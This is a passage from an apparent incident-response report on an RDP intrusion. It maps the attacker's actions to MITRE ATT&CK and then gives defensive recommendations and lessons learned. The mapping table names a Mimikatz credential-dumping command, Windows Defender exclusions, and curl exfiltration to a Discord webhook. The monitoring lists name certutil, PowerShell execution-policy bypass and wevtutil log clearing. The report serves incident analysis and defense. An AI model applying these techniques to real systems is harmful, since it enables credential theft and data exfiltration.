| Defense Evasion | Impair Defenses / Hidden Files & Directories | T1562.001 / T1564.001 | Windows Defender exclusions added (.ps1, .exe, .bat, Temp folder) and hidden staging directory `C:\ProgramData\WindowsCache` created |
| Credential Access | OS Credential Dumping (LSASS Memory) | T1003.001 | Use of renamed Mimikatz (`mm.exe`) with `sekurlsa::logonpasswords` to extract credentials |
| Lateral Movement | Remote Desktop Protocol | T1021.001 | Use of `mstsc.exe` to connect to internal host **10.1.0.188** |
| Exfiltration | Exfiltration Over Web Service | T1567 | Data exfiltrated via `curl.exe` to a Discord webhook (`export-data.zip`) |

---

## Recommendations

### **1. Access Control**

- Disable or restrict **RDP exposure to the internet**
- Enforce **Multi-Factor Authentication (MFA)**
- Implement **account lockout policies**

### **2. Endpoint Security**

- Prevent unauthorized modification of **Windows Defender settings**
- Monitor for:
    - `certutil.exe`
    - `powershell.exe -ExecutionPolicy Bypass`
- Block execution from:
    - `C:\ProgramData`
    - Temp directories

### **3. Detection & Monitoring**

- Alert on:
    - Suspicious scheduled task creation
    - Use of credential dumping tools (Mimikatz patterns)
    - Outbound connections to unknown IPs
- Monitor for **LOLBins abuse**

### **4. Network Security**

- Restrict outbound traffic (especially to unknown IPs)
- Inspect encrypted traffic where possible
- Block known malicious IPs:
    - `78.141.196.6`
    - `88.97.178.12`

### **5. Identity & Privilege Management**

- Audit privileged accounts regularly
- Detect:
    - New account creation
    - Admin group changes
- Remove unauthorized accounts (e.g., `support`)

### **6. Logging & Forensics**

- Prevent log tampering (restrict `wevtutil`)
- Centralize logs (SIEM)
- Enable alerting on log clearing activity

---

## Lessons Learned

- **Lack of MFA on RDP access** allowed attackers to successfully authenticate using compromised credentials.
- **Public exposure of RDP services** significantly increased the attack surface for initial access.
- **Insufficient monitoring of administrative tools** (e.g., `certutil`, `powershell`) delayed detection of malicious activity.
- **Endpoint protections were weakened** through unauthorized Windows Defender exclusions, allowing malware to execute undetected.
- **Lack of alerting on credential dumping behavior** enabled attackers to harvest additional credentials without interruption.
- **Outbound network traffic was not tightly controlled**, allowing communication with attacker infrastructure and data exfiltration via external services.
- **Log tampering was not prevented or alerted on**, reducing visibility into attacker actions during the final stages of the attack.
